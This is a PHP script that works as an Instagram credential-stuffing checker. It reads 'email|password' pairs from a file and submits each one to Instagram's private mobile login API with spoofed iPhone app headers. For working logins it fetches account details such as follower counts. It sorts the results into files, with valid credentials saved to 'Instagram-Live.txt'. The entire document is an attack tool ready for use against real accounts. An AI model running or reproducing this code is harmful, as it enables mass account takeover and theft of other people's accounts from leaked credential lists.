<?php

error_reporting(0);
ini_set('display_errors', 1);
ini_set('max_execution_time', 300000000);
$live = 0;
$die = 0;

$i = 0;
$listcode = $argv[1];
$codelistlist = file_get_contents($listcode);
$code_list_array = file($listcode);
$code = explode(PHP_EOL, $codelistlist);
$count = count($code);
while($i < $count) {
  $status = "Unkown";
  $percentage = round(($i+1)/$count*100,2);
  
  $akun = explode("|", $code[$i]); 
  $email = $akun[0];
  $pass = trim($akun[1]);

  $body = 'signed_body=c38e1bbee45dcfe06a8c809d8ca588a2537ac10e0fae0afe0116e4d13010c7f3.{"phone_id":"6519D668-0F14-4DA3-A655-D5EE58BB706B","password":"'.$pass.'","username":"'.$email.'","device_id":"6519D668-0F14-4DA3-A655-D5EE58BB706B","reg_login":"0","login_attempt_count":0,"adid":"00000000-0000-0000-0000-000000000000"}&ig_sig_key_version=5';
  $ch = curl_init();

  curl_setopt($ch, CURLOPT_URL, "https://i.instagram.com/api/v1/accounts/login/");
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, $body);
  $headers = array();
        $headers[] = "Host: i.instagram.com";
        $headers[] = "Content-Type: application/x-www-form-urlencoded; charset=utf-8";
        $headers[] = "X-IG-Connection-Speed: -1kbps";
        $headers[] = "X-IG-Connection-Type: WiFi";
        $headers[] = "X-IG-App-ID: 124024574287414";
        $headers[] = "X-IG-ABR-Connection-Speed-KBPS: 0";
        $headers[] = "User-Agent: Instagram 50.0.0.52.188 (iPhone9,1; iOS 12_1_2; en_ID; id-ID; scale=2.00; gamut=wide; 750x1334) AppleWebKit/420+";
        $headers[] = "X-IG-Capabilities: 36r/dw==";
        $headers[] = "";
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
  curl_setopt($ch, CURLOPT_POST, 1);

  $result = curl_exec($ch);

  $dataaa = json_decode($result);
  $idi = $dataaa->logged_in_user->pk;
  curl_setopt($ch, CURLOPT_URL, 'https://i.instagram.com/api/v1/users/'.$idi.'/info/?device_id=6519D668-0F14-4DA3-A655-D5EE58BB706B&push_disabled=true');
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
  $headers = array();
        $headers[] = "Host: i.instagram.com";
        $headers[] = "Content-Type: application/x-www-form-urlencoded; charset=utf-8";
        $headers[] = "X-IG-Connection-Speed: -1kbps";
        $headers[] = "X-IG-Connection-Type: WiFi";
        $headers[] = "X-IG-App-ID: 124024574287414";
        $headers[] = "X-IG-ABR-Connection-Speed-KBPS: 0";
        $headers[] = "User-Agent: Instagram 50.0.0.52.188 (iPhone9,1; iOS 12_1_2; en_ID; id-ID; scale=2.00; gamut=wide; 750x1334) AppleWebKit/420+";
        $headers[] = "X-IG-Capabilities: 36r/dw==";
        $headers[] = "";
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    $res = curl_exec($ch);

  if(strpos($result,'"bad_password"')){
    echo "WRONG PASS => $email | $pass \r\n";
    $diee = "die.txt";
    $fopen = fopen($diee, "a+");
    $fwrite = fwrite($fopen, "PASS SALAH => $email | $pass \r\n");
    $die++;
  }elseif(strpos($result,'"invalid_user"')){
    echo "WRONG USERNAME => $email | $pass \r\n";
    $diee = "die.txt";
    $fopen = fopen($diee, "a+");
    $fwrite = fwrite($fopen, "WRONG USERNAME => $email | $pass\r\n");
    fclose($fopen);
    $die++;
  }elseif(strpos($result,'"inactive user"')){
    echo "DISABLE ACCOUNT => $email | $pass \r\n";
    $diee = "disable.txt";
    $fopen = fopen($diee, "a+");
    $fwrite = fwrite($fopen, "DISABLE ACCOUNT => $email | $pass\r\n");
    fclose($fopen);
    $die++;
  }elseif(strpos($result,'"checkpoint_challenge_required"')){
    echo "CHECKPOINT => $email | $pass \r\n";
    $diee = "checkpoint.txt";
    $fopen = fopen($diee, "a+");
    $fwrite = fwrite($fopen, "CHECKPOINT => $email | $pass\r\n");
    fclose($fopen);
    $chk++;
  }elseif(strpos($result,'"ok"')){
    $dataa = json_decode($res);
    // now get data
    $uname = $dataa->user->username;
    $nama = $dataa->user->full_name;
    $id = $dataa->user->pk;
    $buss = $dataa->user->is_potential_business;
    $folls = $dataa->user->follower_count;
    $folwi = $dataa->user->following_count;
    //$verifi = $dataa->logged_in_user->is_verified;
    echo "LIVE => $email | $pass | Username: $uname | Nama: $nama | ID: $id | Bussiness: $buss | Followers: $folls | Following: $folwi \r\n";
    $livee = "Instagram-Live.txt";
    $fopen = fopen($livee, "a+");
    $fwrite = fwrite($fopen, "LIVE => $email | $pass | Username: $uname | Nama: $nama | ID: $id | Bussiness: $buss | Followers: $folls | Following: $folwi \r\n");
    fclose($fopen);
    $live++;
  } else {
    echo "UNKNOWN => $email | $pass \r\n";
  }
  curl_close($ch);
  $i++;
}
echo "\r\nDone | LIVE : $live | DIE : $die | CHECKPOINT : $chk | Total : $count";

